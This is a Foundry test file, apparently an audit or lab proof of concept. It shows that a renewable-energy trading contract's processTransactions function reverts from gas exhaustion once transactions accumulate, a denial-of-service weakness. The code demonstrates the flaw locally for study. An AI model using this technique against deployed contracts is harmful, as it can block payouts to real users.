// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../lib/forge-std/src/Test.sol";
import "../src/RenewableEnergy.sol";

contract ProofOfConcept is Test {
    RenewableEnergyContract public contractInstance;
    address public owner;
    address payable public consumer;
    address payable public producer;

    function setUp() public {
        contractInstance = new RenewableEnergyContract();
        owner = address(this);
        producer = payable(vm.addr(10));
        consumer = payable(vm.addr(20));

        vm.deal(address(contractInstance), 1 ether);
    }

    function testExploit() public {
        console.log(
            "-------------------------------------------------------------------------------"
        );
        console.log(unicode"\n\tRegistering producer and consumer\n");
        console.log(
            "-------------------------------------------------------------------------------"
        );

        contractInstance.registerProducer(producer);
        contractInstance.registerConsumer(consumer);

        console.log("Producer: %s registered.", producer);
        console.log("Consumer: %s registered.", consumer);

        uint256 numIteraciones = 10;
        console.log(
            "-------------------------------------------------------------------------------"
        );
        console.log(unicode"\n\tAdding transactions\n");
        console.log(
            "-------------------------------------------------------------------------------"
        );

        for (uint256 i = 0; i < numIteraciones; i++) {
            contractInstance.addTransaction{value: 1 ether}(
                producer,
                consumer,
                1 ether,
                1
            );
            console.log(
                unicode"| => Transaction added: %s ether |",
                1 ether / 1 ether
            );
        }

        vm.assertEq(
            address(contractInstance).balance,
            (numIteraciones * 1 ether) + 1 ether
        );
        vm.assertEq(contractInstance.getTransactionCount(), numIteraciones);

        console.log(
            "-------------------------------------------------------------------------------"
        );
        console.log(
            unicode"| => Contract balance: %s ether",
            address(contractInstance).balance / 1 ether
        );
        console.log(
            "-------------------------------------------------------------------------------"
        );

        console.log(unicode"\n\tProcessing transactions normally\n");

        contractInstance.processTransactions();
        console.log(
            "-------------------------------------------------------------------------------"
        );
        console.log(unicode"| => Transactions processed normally |");
        console.log(
            "-------------------------------------------------------------------------------"
        );

        // Add a large number of transactions again
        for (uint256 i = 0; i < numIteraciones; i++) {
            contractInstance.addTransaction{value: 1 ether}(
                producer,
                consumer,
                1 ether,
                1
            );
            console.log(
                unicode"| => Transaction added: %s ether |",
                1 ether / 1 ether
            );
        }

        console.log(
            "-------------------------------------------------------------------------------"
        );
        console.log(
            unicode"| => Contract balance: %s ether",
            address(contractInstance).balance / 1 ether
        );
        console.log(
            "-------------------------------------------------------------------------------"
        );

        console.log(
            unicode"\n\tAttempting to process transactions with limited gas\n"
        );

        bool didRevert = false;
        try contractInstance.processTransactions{gas: 10000}() {
            didRevert = false;
        } catch {
            didRevert = true;
        }

        console.log(
            "-------------------------------------------------------------------------------"
        );
        console.log(
            unicode"| => Did the transaction processing revert due to out of gas? %s",
            didRevert ? "Yes" : "No"
        );
        console.log(
            "-------------------------------------------------------------------------------"
        );

        assertTrue(
            didRevert,
            "Expected processTransactions to revert due to out of gas."
        );
    }
}
